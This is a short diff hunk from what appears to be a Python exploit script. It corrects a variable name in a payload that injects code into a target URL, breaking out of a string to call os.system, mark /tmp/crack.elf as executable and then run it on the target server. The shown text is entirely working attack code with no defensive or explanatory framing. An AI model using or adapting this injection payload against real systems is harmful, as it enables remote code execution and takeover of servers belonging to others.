@@ -27,7 +27,7 @@ def main():
     cmd = "chmod +x /tmp/crack.elf"
     get(target + "';path='/';os.system("+"'"+cmd+"'"+");"+"'")
     cmd = "/tmp/crack.elf"
-    get(target + "';path='/';os.system("+"'"+cmd2+"'"+");"+"'")
+    get(target + "';path='/';os.system("+"'"+cmd+"'"+");"+"'")
     
 
 if __name__ == '__main__':
